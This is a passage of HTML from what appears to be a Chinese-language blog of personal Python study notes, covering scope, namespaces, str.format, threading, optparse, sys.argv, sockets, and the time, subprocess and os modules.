class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python 的名称与对象</span><br><span class=\"line\"></span><br><span class=\"line\">起初，名称a引用对象2；</span><br><span class=\"line\">然后，执行操作a &#x3D; a + 1，这时对象3被创建，名称a引用对象3，所以id(a)和id(3)输出相同的地址;</span><br><span class=\"line\">最后，执行b &#x3D; 2，名称b引用对象2，所以id(2)和id(b)输出相同的地址</span><br><span class=\"line\"></span><br><span class=\"line\">这个例子也展示了 Python 在执行变量的赋值时，并不会重复创建一个对象的事实。名称采用动态绑定的机制使得 Python 更加高效，同一个名称可以引用不同类型的对象。</span><br><span class=\"line\"></span><br><span class=\"line\">a &#x3D; 5</span><br><span class=\"line\">a &#x3D; &#39;hello world&#39;</span><br><span class=\"line\">a &#x3D; [1, 2, 3]</span><br><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">可以看到，a先后引用了数字，字符串，列表的类型的对象，这在 Python 中完全是合法的。</span><br></pre></td></tr></table></figure>\n<p><strong>名称空间</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内置名称空间，例如，内置名称空间包含 Python 的内置函数，如，abs()</span><br><span class=\"line\">模块名称空间，全局名称空间，在模块内定义的名称</span><br><span class=\"line\">局部名称空间，例如，在函数（function）或者类（class）被调用时，其内部包含的名称</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110203037210.png\" alt=\"\"></strong></p>\n<p><strong>变量的作用域</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python 的作用域（scope）决定了我们在程序中能否直接使用名称空间中的名称，直接访问的意思是指不需要在名称前添加名称空间的前缀。对于 Python 来说，至少存在以下三类的作用域。</span><br><span class=\"line\"></span><br><span class=\"line\">函数作用域，包括了函数内的局部名称</span><br><span class=\"line\">模块作用域，包括了模块内的全局名称</span><br><span class=\"line\">内置作用域，包括了内置名称</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110204400798.png\" alt=\"image-20201110204400798\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先给定一个原则：函数中的变量为局部变量，首先在该函数体中寻找该变量的值，且是按顺序寻找的，找不到的话再去函数外面的全局变量需找。同理，函数外部的变量首先在全局变量寻找，寻找不到就找不到了，函数中定义的话，是没用的。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、j &#x3D;&#x3D; 3 and k&#x3D;&#x3D; 4</span><br><span class=\"line\">程序中首先执行的是proc1()，此时在函数proc1()中寻找j,k的局部变量，为j&#x3D;3,k&#x3D;4。</span><br><span class=\"line\"></span><br><span class=\"line\">2、j &#x3D;&#x3D; 1 and k&#x3D;&#x3D; 7</span><br><span class=\"line\">程序然后执行：print(“j &#x3D;&#x3D; %d and k&#x3D;&#x3D; %d” % (j,k))</span><br><span class=\"line\">在全局变量中寻找变量j,k的值，得到答案。</span><br><span class=\"line\"></span><br><span class=\"line\">3、j &#x3D;&#x3D; 3 and k&#x3D;&#x3D; 4</span><br><span class=\"line\">程序随后执行proc2()。</span><br><span class=\"line\">函数proc2()中首先执行proc1()，此时得到的结果如同1.</span><br><span class=\"line\"></span><br><span class=\"line\">4、j &#x3D;&#x3D; 6 and k&#x3D;&#x3D; 7</span><br><span class=\"line\">然后执行函数proc2()中的：print(“j &#x3D;&#x3D; %d and k&#x3D;&#x3D; %d” % (j,k))</span><br><span class=\"line\">此时先从函数proc2()中寻找j,k的值，结果只找到第10行，j&#x3D;6，k值函数proc2()中没有定义，就从函数外寻找，找到第14行的，k&#x3D;7，得到结果。</span><br><span class=\"line\"></span><br><span class=\"line\">5、j &#x3D;&#x3D; 8 and k&#x3D;&#x3D; 7</span><br><span class=\"line\">这个就很明显了，从全局变量寻找变量的值。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201110205413997.png\" alt=\"image-20201110205413997\"></strong></p>\n<h2 id=\"from-import-语句\"><a class=\"markdownIt-Anchor\" href=\"#from-import-语句\">#</a> <strong>from-import 语句</strong></h2>\n<figure class=\"highlight plain\"><figcaption><span>from-import 语句</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">你可以在你的模块里导入指定的模块属性。也就是把指定名称导入到当前作用域。使用 from-import</span><br><span class=\"line\">异步社区Kensuke(18319066421) 专享 请尊重版权</span><br><span class=\"line\">12.4 导入模块 317</span><br><span class=\"line\">语句可以实现我们的目的，它的语法是：</span><br><span class=\"line\">from module import name1[, name2[,... nameN]]</span><br></pre></td></tr></table></figure>\n<h2 id=\"format格式化函数\"><a class=\"markdownIt-Anchor\" href=\"#format格式化函数\">#</a> <strong>format 格式化函数</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能。</span><br><span class=\"line\"></span><br><span class=\"line\">基本语法是通过 &#123;&#125; 和 : 来代替以前的 % 。</span><br><span class=\"line\">format 函数可以接受不限个参数，位置可以不按顺序。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201111180151642.png\" alt=\"image-20201111180151642\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201111185849334.png\" alt=\"image-20201111185849334\"></strong></p>\n<p><strong>str.format () 传入对象</strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201111190242360.png\" alt=\"image-20201111190242360\"></strong></p>\n<h2 id=\"join\"><a class=\"markdownIt-Anchor\" href=\"#join\">#</a> <strong>join()</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Thread中，join（）方法的作用是调用线程等待该线程完成后，才能继续用下运行。</span><br></pre></td></tr></table></figure>\n<h2 id=\"threading\"><a class=\"markdownIt-Anchor\" href=\"#threading\">#</a> <strong>threading</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    </span><br><span class=\"line\">- threading的使用</span><br><span class=\"line\">    - 直接利用threading.Thread生成Thread实例</span><br><span class=\"line\">1. t &#x3D; threading.Thread(target&#x3D;xxx, args&#x3D;(xxx,))</span><br><span class=\"line\">2. t.start():启动多线程</span><br><span class=\"line\">3. t.join(): 等待多线程执行完成</span><br><span class=\"line\">4. 案例04</span><br><span class=\"line\">5. 案例05: 加入join后比较跟案例04的结果的异同</span><br><span class=\"line\">  - 守护线程-daemon</span><br><span class=\"line\">  - 如果在程序中将子线程设置成守护现成，则子线程会在主线程结束的时候自动退出</span><br><span class=\"line\">  - 一般认为，守护线程不中要或者不允许离开主线程独立运行</span><br><span class=\"line\">  - 守护线程案例能否有效果跟环境相关</span><br><span class=\"line\">  - 案例06非守护线程</span><br><span class=\"line\">  - 案例07守护线程  </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">线程常用属性</span><br><span class=\"line\">           -  threading.currentThread：返回当前线程变量</span><br><span class=\"line\">           - threading.enumerate:返回一个包含正在运行的线程的list，正在运行的线程指的是线程启动后，结束前的状态</span><br><span class=\"line\">           - threading.activeCount: 返回正在运行的线程数量，效果跟 len(threading.enumerate)相同</span><br><span class=\"line\">           - thr.setName: 给线程设置名字</span><br><span class=\"line\">           - thr.getName: 得到线程的名字</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> subprocess</span><br><span class=\"line\">    - 完全跳过线程，使用进程</span><br><span class=\"line\">    - 是派生进程的主要替代方案</span><br><span class=\"line\">    - python2.4后引入</span><br><span class=\"line\">- multiprocessiong</span><br><span class=\"line\">    - 使用threadiing借口派生，使用子进程</span><br><span class=\"line\">    - 允许为多核或者多cpu派生进程，接口跟threading非常相似</span><br><span class=\"line\">    - python2.6</span><br><span class=\"line\">    </span><br><span class=\"line\">- concurrent.futures</span><br><span class=\"line\">    - 新的异步执行模块</span><br><span class=\"line\">    - 任务级别的操作</span><br><span class=\"line\">    - python3.2后引入</span><br></pre></td></tr></table></figure>\n<h2 id=\"queue模块线程间通信\"><a class=\"markdownIt-Anchor\" href=\"#queue模块线程间通信\">#</a> <strong>queue 模块 (线程间通信)</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115104731877.png\" alt=\"image-20201115104731877\"></strong></p>\n<h2 id=\"optparse模块\"><a class=\"markdownIt-Anchor\" href=\"#optparse模块\">#</a> <strong>optparse 模块</strong></h2>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Python 有两个内建的模块用于处理命令行参数：</span><br><span class=\"line\">一个是 getopt，《Deep <span class=\"keyword\">in</span> python》一书中也有提到，只能简单处理命令行参数；</span><br><span class=\"line\">另一个是 optparse，它功能强大，而且易于使用，可以方便地生成标准的、符合Unix/Posix 规范的命令行说明。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">说回正题。当我们要利用server与client进行FTP文件传输的时候，在client端往往需要输入诸如 -s <span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span> -p <span class=\"number\">9001</span> 这样的信息，当然我们不能控制用户的输入，如果用户随意的输入错误的命令，比如不写IP地址，只是写-s -p <span class=\"number\">9001</span>，或者只写 -s -p。我们如果还用sys.argv获取参数的话需要做很多麻烦的逻辑判断，这给我们开发程序带来了很大的不便。</span><br><span class=\"line\"></span><br><span class=\"line\">　　但是如果我们利用optparse会十分便捷的解决这样的问题。</span><br></pre></td></tr></table></figure>\n<p><strong>optparse 用法如下</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> optparse</span><br><span class=\"line\">parser = optparse.OptionParser()</span><br><span class=\"line\">parser.add_option(<span class=\"string\">&quot;-s&quot;</span>, <span class=\"string\">&quot;--server&quot;</span>, dest=<span class=\"string\">&quot;server&quot;</span>, help=<span class=\"string\">&quot;ftp server ip_address&quot;</span>)</span><br><span class=\"line\">parser.add_option(<span class=\"string\">&quot;-P&quot;</span>, <span class=\"string\">&quot;--port&quot;</span>, type=<span class=\"string\">&quot;int&quot;</span>, dest=<span class=\"string\">&quot;port&quot;</span>, help=<span class=\"string\">&quot;ftp server port&quot;</span>)</span><br><span class=\"line\">parser.add_option(<span class=\"string\">&quot;-u&quot;</span>, <span class=\"string\">&quot;--username&quot;</span>, dest=<span class=\"string\">&quot;username&quot;</span>, help=<span class=\"string\">&quot;username info&quot;</span>)</span><br><span class=\"line\">parser.add_option(<span class=\"string\">&quot;-p&quot;</span>, <span class=\"string\">&quot;--password&quot;</span>, dest=<span class=\"string\">&quot;password&quot;</span>, help=<span class=\"string\">&quot;password info&quot;</span>)   </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">　首先import optparse类，然后创建optparse对象parser，再使用add_option()来定义命令行参数，最后使用parse_args()来解析命令行。</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115092603340.png\" alt=\"image-20201115092603340\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115092624204.png\" alt=\"image-20201115092624204\"></strong></p>\n<h2 id=\"sysargv用法简明\"><a class=\"markdownIt-Anchor\" href=\"#sysargv用法简明\">#</a> <strong>sys.argv [] 用法简明</strong></h2>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115085754249.png\" alt=\"image-20201115085754249\"></strong></p>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115090603888.png\" alt=\"image-20201115090603888\"></strong></p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">那我们再把代码修改一下：</span><br><span class=\"line\">a=sys.argv[<span class=\"number\">2</span>：]</span><br><span class=\"line\">保存后，再从控制台窗台运行程序，这次多加几个参数，以空格隔开:</span><br><span class=\"line\">得到的结果为[‘b’, ’c’, ’d’, ’e’, ’f’]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115090659198.png\" alt=\"image-20201115090659198\"></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sys.argv[ ]其实就是一个列表，里边的项为用户输入的参数，关键就是要明白这参数是从程序外部输入的，而非代码本身的什么地方，要想看到它的效果就应该将程序保存了，从外部来运行程序并给出参数。</span><br></pre></td></tr></table></figure>\n<h2 id=\"socket-模块\"><a class=\"markdownIt-Anchor\" href=\"#socket-模块\">#</a> <strong>socket 模块</strong></h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socket.socket()创建一个类型为套接字类型socket.SOCK_STREAM的sock对象，默认使用TCP协议</span><br><span class=\"line\">socket.AF_INET 面向网络的因特网</span><br><span class=\"line\">socket.SOCK_DGRAM创建UDP的socket是不可靠的。而且数据据的读取写发送是可以无序的</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s.bind()　绑定地址(ip地址,端口)到套接字,参数必须是元组的格式例如：s.bind((&#x27;<span class=\"number\">127</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">1</span>&#x27;,<span class=\"number\">8009</span>))</span><br><span class=\"line\">s.listen(<span class=\"number\">5</span>)　　开始监听，<span class=\"number\">5</span>为最大挂起的连接数</span><br><span class=\"line\">s.accept()　　被动接受客户端连接，阻塞，等待连接</span><br><span class=\"line\">客户端套接字函数</span><br><span class=\"line\">s.connect()　　连接服务器端，参数必须是元组格式例如：</span><br><span class=\"line\">s.connect((&#x27;<span class=\"number\">127</span>,<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">1</span>&#x27;,<span class=\"number\">8009</span>))</span><br><span class=\"line\">公共用途的套接字函数</span><br><span class=\"line\">s.recv(<span class=\"number\">1024</span>)　　接收TCP数据，<span class=\"number\">1024</span>为一次数据接收的大小</span><br><span class=\"line\">s.send(bytes)　　发送TCP数据，python3发送数据的格式必须为bytes格式</span><br><span class=\"line\">s.sendall()　　完整发送数据，内部循环调用send</span><br><span class=\"line\">s.close()　　关闭套接字</span><br><span class=\"line\">s.recvfrom()  接受UDP数据</span><br><span class=\"line\">s.sendto()  发送UDP数据</span><br></pre></td></tr></table></figure>\n<h2 id=\"time-模块\"><a class=\"markdownIt-Anchor\" href=\"#time-模块\">#</a> <strong>time 模块</strong></h2>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">time</span>.localtime([secs])：将一个时间戳转换为当前时区的struct_time,以当前时间为准。</span><br><span class=\"line\"><span class=\"built_in\">time</span>.<span class=\"built_in\">time</span>()：返回当前时间的时间戳。</span><br><span class=\"line\"><span class=\"built_in\">time</span>.sleep(secs)：线程推迟指定的时间运行。单位为秒。</span><br><span class=\"line\">strftime(<span class=\"built_in\">format</span>[, t ])</span><br><span class=\"line\"><span class=\"built_in\">format</span>  - 格式字符串 t - 可选的参数t是一个struct_time对象</span><br><span class=\"line\">返回值：可读字符串标识的当地时间</span><br><span class=\"line\">gmtime()</span><br><span class=\"line\">参数：转换为<span class=\"built_in\">time</span>.stryct_time类型的对面的秒数</span><br><span class=\"line\">ctime()</span><br><span class=\"line\">参数: 要转换为字符串时间的秒数</span><br><span class=\"line\">clock()</span><br><span class=\"line\">返回值：</span><br><span class=\"line\">该函数有两个功能，</span><br><span class=\"line\">在第一次调用的时候，返回的是程序运行的实际时间；</span><br><span class=\"line\">以第二次之后的调用，返回的是自第一次调用后,到这次调用的时间间隔</span><br></pre></td></tr></table></figure>\n<p><strong><img data-src=\"E:%5Ctypora%E7%AC%94%E8%AE%B0%5Ctypora-user-images%5Cimage-20201115104610446.png\" alt=\"image-20201115104610446\"></strong></p>\n<h2 id=\"subprocess-模块\"><a class=\"markdownIt-Anchor\" href=\"#subprocess-模块\">#</a> <strong>subprocess 模块</strong></h2>\n<p><strong>subprocess 模块中的常用函数</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>函数</strong></th>\n<th><strong>描述</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.run()</strong></td>\n<td><strong>Python 3.5 中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的 CompletedProcess 类的实例。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.call()</strong></td>\n<td><strong>执行指定的命令，返回命令执行状态，其功能类似于 os.system (cmd)。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.check_call()</strong></td>\n<td><strong>Python 2.5 中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于 subprocess.run (…, check=True)。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.check_output()</strong></td>\n<td><strong>Python 2.7 中新增的的函数。执行指定的命令，如果执行状态码为 0 则返回命令执行结果，否则抛出异常。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.getoutput(cmd)</strong></td>\n<td><strong>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于 os.popen (cmd).read () 和 commands.getoutput (cmd)。</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>subprocess.getstatusoutput(cmd)</strong></td>\n<td><strong>执行 cmd 命令，返回一个元组 (命令执行状态，命令执行结果输出)，其功能类似于 commands.getstatusoutput ()。</strong></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"os模块\"><a class=\"markdownIt-Anchor\" href=\"#os模块\">#</a> <strong>os 模块</strong></h2>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">os.sep:取代操作系统特定的路径分隔符</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.name</span>:指示你正在使用的工作平台。比如对于<span class=\"title\">Windows</span>，它是&#x27;<span class=\"title\">nt</span>&#x27;，而对于<span class=\"title\">Linux</span>/<span class=\"title\">Unix</span>用户，它是&#x27;<span class=\"title\">posix</span>&#x27;。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.getcwd</span>:得到当前工作目录，即当前<span class=\"title\">python</span>脚本工作的目录路径。</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.getenv</span>()和<span class=\"title\">os.putenv</span>:分别用来读取和设置环境变量</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.listdir</span>():返回指定目录下的所有文件和目录名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.remove</span>(<span class=\"title\">file</span>):删除一个文件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.stat</span>（<span class=\"title\">file</span>）:获得文件属性</span></span><br><span class=\"line\"><span class=\"function\">20<span class=\"title\">os.chmod</span>(<span class=\"title\">file</span>):修改文件权限和时间戳</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.mkdir</span>(<span class=\"title\">name</span>):创建目录</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.rmdir</span>(<span class=\"title\">name</span>):删除目录</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.removedirs</span>（<span class=\"title\">r</span>“<span class=\"title\">c</span>：\\<span class=\"title\">python</span>”）:删除多个目录</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.system</span>():运行<span class=\"title\">shell</span>命令</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.exit</span>():终止当前进程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.linesep</span>:给出当前平台的行终止符。例如，<span class=\"title\">Windows</span>使用&#x27;\\<span class=\"title\">r</span>\\<span class=\"title\">n</span>&#x27;，<span class=\"title\">Linux</span>使用&#x27;\\<span class=\"title\">n</span>&#x27;而<span class=\"title\">Mac</span>使用&#x27;\\<span class=\"title\">r</span>&#x27;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.split</span>(): 返回一个路径的目录名和文件名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.isfile</span>()和<span class=\"title\">os.path.isdir</span>()分别检验给出的路径是一个目录还是文件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.existe</span>():检验给出的路径是否真的存在</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.listdir</span>(<span class=\"title\">dirname</span>):列出<span class=\"title\">dirname</span>下的目录和文件</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.getcwd</span>():获得当前工作目录</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.curdir</span>:返回当前目录（&#x27;.&#x27;）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.chdir</span>(<span class=\"title\">dirname</span>):改变工作目录到<span class=\"title\">dirname</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.isdir</span>(<span class=\"title\">name</span>):判断<span class=\"title\">name</span>是不是目录，不是目录就返回<span class=\"title\">false</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.isfile</span>(<span class=\"title\">name</span>):判断<span class=\"title\">name</span>这个文件是否存在，不存在返回<span class=\"title\">false</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.exists</span>(<span class=\"title\">name</span>):判断是否存在文件或目录<span class=\"title\">name</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.getsize</span>(<span class=\"title\">name</span>):或得文件大小，如果<span class=\"title\">name</span>是目录返回0<span class=\"title\">L</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.abspath</span>(<span class=\"title\">name</span>):获得绝对路径</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.isabs</span>():判断是否为绝对路径</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.normpath</span>(<span class=\"title\">path</span>):规范<span class=\"title\">path</span>字符串形式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.split</span>(<span class=\"title\">name</span>):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.splitext</span>():分离文件名和扩展名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.join</span>(<span class=\"title\">path</span>,<span class=\"title\">name</span>):连接目录与文件名或目录</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.basename</span>(<span class=\"title\">path</span>):返回文件名</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">os.path.dirname</span>(<span class=\"title\">path</span>):返回文件路径</span></span><br></pre></td></tr></table></figure>\n<p><strong>文件操作</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">os.&#96;&#96;mknod&#96;&#96;(&#96;&#96;&quot;text.txt&quot;&#96;&#96;)：创建空文件</span><br><span class=\"line\">fp &#x3D; &#96;&#96;open&#96;&#96;(&#96;&#96;&quot;text.txt&quot;&#96;&#96;,w):直接打开一个文件，如果文件不存在就创建文件</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 